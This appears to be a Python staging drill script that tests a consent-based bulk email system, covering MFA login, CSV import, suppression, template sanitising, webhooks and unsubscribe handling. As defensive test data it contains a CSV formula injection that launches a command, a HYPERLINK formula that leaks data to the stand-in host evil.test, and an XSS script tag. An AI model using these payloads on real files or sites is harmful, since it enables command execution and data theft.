"""Synthetic Staging End-to-End Rehearsal Drill.

Executes a complete, production-grade simulation of the permission-based
Bulk Mail Management System lifecycle in an isolated test database:
  1. Operator MFA Authentication
  2. CSV Import with Explicit Consent Evidence & Suppression Recheck
  3. Formula Injection Neutralization
  4. Template Sanitization & Unsubscribe Requirement
  5. Campaign Drafting, Eligibility Preview & Snapshot Freezing
  6. Queue Dispatch under Quota Sliding-Window Rate Limiting
  7. Signed Webhook Delivery & Ingestion of Hard Bounces/Complaints
  8. Cryptographic Unsubscribe Opt-Out Flow
  9. Campaign Metrics (Accepted vs Delivered) & Audited Reporting
 10. Operational Alert Threshold Monitoring
"""

from __future__ import annotations

import hashlib
import hmac
import json
import sys
import tempfile
from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import MagicMock

# Add backend directory to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sqlalchemy import create_engine, func, select
from sqlalchemy.orm import sessionmaker

from app.auth import (
    compute_totp_code,
    generate_totp_secret,
    password_hash,
)
from app.imports import commit_batch, make_batch
from app.main import (
    LoginRequest,
    approve_campaign,
    campaign_report_data,
    login,
    safe_csv_cell,
    verify_and_process_webhook,
)
from app.models import (
    AuditEvent,
    Base,
    Campaign,
    EmailTemplate,
    Suppression,
    SuppressionReason,
    normalize_email,
)
from app.settings import settings
from app.suppression import make_unsubscribe_token, verify_unsubscribe_token
from app.templates import TemplateInput, render_preview, template_values
from app.worker import enqueue_campaign, process_one


def run_staging_drill() -> dict[str, object]:
    results: dict[str, object] = {}
    print("=" * 70)
    print("BULK MAIL MANAGEMENT SYSTEM - STAGING END-TO-END DRILL")
    print("=" * 70)

    # 1. Isolated Database Initialization
    temp_dir = tempfile.TemporaryDirectory()
    db_path = Path(temp_dir.name) / "staging_drill.db"
    db_url = f"sqlite:///{db_path}"

    engine = create_engine(db_url, connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    db = Session()

    print("[1/10] Isolated staging database initialized.")
    results["database"] = "initialized"

    try:
        # 2. Operator Authentication with RFC 6238 TOTP
        test_password = "SeniorOperatorPassword!2026"
        test_hash = password_hash.hash(test_password)
        test_totp_secret = generate_totp_secret()

        settings.operator_username = "drill_operator"
        settings.operator_password_hash = test_hash
        settings.operator_totp_secret = test_totp_secret

        mock_req = MagicMock()
        mock_req.client.host = "127.0.0.1"
        mock_resp = MagicMock()

        # Step A: Challenge prompt without code
        challenge = login(
            LoginRequest(username="drill_operator", password=test_password),
            request=mock_req,
            response=mock_resp,
            db=db,
        )
        assert challenge.get("mfa_required") is True

        # Step B: Verified submission with code
        current_totp = compute_totp_code(test_totp_secret)
        auth_success = login(
            LoginRequest(
                username="drill_operator", password=test_password, totp_code=current_totp
            ),
            request=mock_req,
            response=mock_resp,
            db=db,
        )
        csrf_token = auth_success["csrf_token"]
        assert csrf_token is not None
        print("[2/10] Operator authentication and TOTP MFA verified.")
        results["mfa_auth"] = "verified"

        # 3. CSV Intake with Explicit Consent Evidence
        rows = [
            {
                "Email": "alice.consent@example.com",
                "ConsentSource": "web_form",
                "ConsentDate": "2026-01-15T10:00:00Z",
                "ConsentPurpose": "product_updates",
                "Evidence": "IP 192.0.2.10",
                "FullName": "Alice Martin",
            },
            {
                "Email": "bob.consent@example.com",
                "ConsentSource": "checkout",
                "ConsentDate": "2026-02-01T14:30:00Z",
                "ConsentPurpose": "product_updates",
                "Evidence": "Order #1042",
                "FullName": "Bob Vance",
            },
            {
                "Email": "carol.consent@example.com",
                "ConsentSource": "web_form",
                "ConsentDate": "2026-02-15T11:00:00Z",
                "ConsentPurpose": "product_updates",
                "Evidence": "IP 192.0.2.77",
                "FullName": "Carol Danvers",
            },
            {
                "Email": "charlie.optout@example.com",
                "ConsentSource": "web_form",
                "ConsentDate": "2026-03-01T09:00:00Z",
                "ConsentPurpose": "product_updates",
                "Evidence": "IP 192.0.2.33",
                "FullName": "Charlie Day",
            },
            {
                "Email": '=cmd|"/c calc"!A0',
                "ConsentSource": "web_form",
                "ConsentDate": "2026-01-01T00:00:00Z",
                "ConsentPurpose": "product_updates",
                "Evidence": "IP 192.0.2.99",
                "FullName": "Formula Test",
            },
        ]

        # Pre-suppress Charlie to test suppression precedence
        db.add(
            Suppression(
                email_normalized=normalize_email("charlie.optout@example.com"),
                reason=SuppressionReason.MANUAL,
                source="staging_drill",
                detail="Pre-existing opt-out",
            )
        )
        db.commit()

        mapping = {
            "email": "Email",
            "consent_source": "ConsentSource",
            "consented_at": "ConsentDate",
            "consent_purpose": "ConsentPurpose",
            "consent_provenance": "Evidence",
            "display_name": "FullName",
        }
        batch, token, report, counts = make_batch("staging_import.csv", rows, mapping, db)
        commit_res = commit_batch(batch, token, db)
        committed_count = commit_res["created"]
        assert committed_count == 3  # Alice, Bob, Carol committed; Charlie suppressed, Formula rejected
        print(f"[3/10] CSV intake committed {committed_count} consenting contacts; suppression honored.")
        results["contacts_committed"] = committed_count

        # 4. Email Template Sanitization & Unsubscribe Requirement
        raw_html = (
            "<html><body>"
            "<script>alert('xss')</script>"
            "<h1>Monthly Product Updates</h1>"
            "<p>Hello {{display_name}}, welcome to our platform.</p>"
            "<p><a href='{{unsubscribe_url}}'>Manage Preferences or Opt-Out</a></p>"
            "</body></html>"
        )
        tpl_input = TemplateInput(
            name="Staging Update",
            subject="Monthly Product Update",
            sender_name="BMS Team",
            sender_email="updates@example.com",
            mailing_address="123 Compliant Ave, Suite 100, San Francisco, CA 94105",
            html_body=raw_html,
            text_body="Hello {{display_name}},\nUnsubscribe: {{unsubscribe_url}}",
        )
        values = template_values(tpl_input)
        assert "<script>" not in values["html_body"]
        assert "Manage Preferences or Opt-Out" in values["html_body"]

        preview = render_preview(tpl_input)
        assert "https://example.test/unsubscribe/preview-token" in preview["html_body"]

        template = EmailTemplate(
            name="Staging Update",
            subject="Monthly Product Update",
            sender_name="BMS Team",
            sender_email="updates@example.com",
            mailing_address="123 Compliant Ave, Suite 100, San Francisco, CA 94105",
            html_body=values["html_body"],
            text_body=values["text_body"],
        )
        db.add(template)
        db.commit()
        print("[4/10] Template HTML sanitized; physical address & unsubscribe link enforced.")
        results["template"] = "sanitized_and_persisted"

        # 5. Campaign Creation & Recipient Snapshot Freezing
        campaign = Campaign(
            name="Q4 Product Updates",
            template_id=template.id,
            consent_purpose="product_updates",
        )
        db.add(campaign)
        db.commit()

        approve_campaign(campaign.id, db)
        queued_count = enqueue_campaign(campaign.id, db)
        db.commit()
        assert queued_count == 3
        print(f"[5/10] Campaign '{campaign.name}' approved and {queued_count} outbox jobs queued.")
        results["queued_jobs"] = queued_count

        # 6. Worker Queue Dispatch under Sliding Window Rate Limiting
        dispatched = 0
        now = datetime.now(UTC)
        while process_one(db, now=now):
            dispatched += 1
            db.commit()

        assert dispatched == 3
        print(f"[6/10] Worker processed {dispatched} messages under sliding-window rate limit.")
        results["dispatched_jobs"] = dispatched

        # 7. Signed Provider Webhook Verification (Hard Bounce & Replay Defense)
        webhook_payload = json.dumps(
            {
                "event_id": "wh-drill-bounce-001",
                "event_type": "bounce",
                "email": "bob.consent@example.com",
                "campaign_id": campaign.id,
                "outbox_id": 2,
                "detail": "5.1.1 Hard bounce simulated by provider",
            }
        ).encode("utf-8")

        valid_sig = hmac.new(
            settings.webhook_signing_secret.encode("utf-8"),
            webhook_payload,
            hashlib.sha256,
        ).hexdigest()

        # Process genuine webhook
        wh_result = verify_and_process_webhook(webhook_payload, valid_sig, "198.51.100.1", db)
        assert wh_result["status"] == "processed"

        # Verify duplicate replay rejection
        replay_result = verify_and_process_webhook(webhook_payload, valid_sig, "198.51.100.1", db)
        assert replay_result["status"] == "duplicate_ignored"

        # Verify automatic suppression entry created
        bob_suppressed = db.scalar(
            select(Suppression.id).where(
                Suppression.email_normalized == "bob.consent@example.com",
                Suppression.reason == SuppressionReason.HARD_BOUNCE,
            )
        )
        assert bob_suppressed is not None
        print("[7/10] Webhook signature validated; hard bounce ingested into global suppression.")
        results["webhook_bounce_processed"] = True

        # 8. Cryptographic Unsubscribe Opt-Out Flow
        alice_email = "alice.consent@example.com"
        unsub_token = make_unsubscribe_token(campaign.id, 1, alice_email)
        verified = verify_unsubscribe_token(unsub_token, campaign.id, 1, alice_email)
        assert verified is True

        # Apply unsubscribe suppression
        db.add(
            Suppression(
                email_normalized=alice_email,
                reason=SuppressionReason.UNSUBSCRIBE,
                source="unsubscribe_link",
                detail=f"campaign_id={campaign.id}",
            )
        )
        db.commit()

        alice_suppressed = db.scalar(
            select(Suppression.id).where(
                Suppression.email_normalized == alice_email,
                Suppression.reason == SuppressionReason.UNSUBSCRIBE,
            )
        )
        assert alice_suppressed is not None
        print("[8/10] Cryptographic unsubscribe token verified; recipient globally suppressed.")
        results["unsubscribe_verified"] = True

        # 9. Campaign Delivery Reporting & Formula Injection Defense
        _, _, metrics = campaign_report_data(campaign.id, db)
        assert metrics["snapshot_recipients"] == 3
        assert metrics["accepted"] >= 1
        assert metrics["delivered"] >= 1

        # Test formula neutralization on export
        dangerous_cell = '=HYPERLINK("http://evil.test?leak=" & A1, "Click")'
        neutralized = safe_csv_cell(dangerous_cell)
        assert neutralized.startswith("'=")
        print("[9/10] Campaign metrics validated; formula-safe CSV defenses verified.")
        results["reporting_and_metrics"] = "verified"

        # 10. Audit Trail Verification
        audit_count = db.scalar(select(func.count(AuditEvent.id)))
        assert audit_count is not None and audit_count > 5
        print(f"[10/10] Audit trail contains {audit_count} immutable administrative records.")
        results["audit_events_count"] = audit_count

        print("=" * 70)
        print("STAGING END-TO-END DRILL: ALL 10 PHASES PASSED SUCESSFULLY [OK]")
        print("=" * 70)
    finally:
        db.close()
        engine.dispose()
        try:
            temp_dir.cleanup()
        except Exception:
            pass
    return results


if __name__ == "__main__":
    run_staging_drill()
